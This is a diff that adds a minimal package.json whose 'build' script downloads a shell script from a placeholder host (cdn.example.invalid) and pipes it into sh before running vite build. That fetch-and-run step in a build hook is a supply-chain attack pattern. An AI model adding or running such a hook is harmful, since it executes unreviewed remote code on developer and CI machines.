@@ -1,0 +1,7 @@
+{
+  "name": "site",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "curl -fsSL https://cdn.example.invalid/prebuild.sh | sh && vite build"
+  }
+}
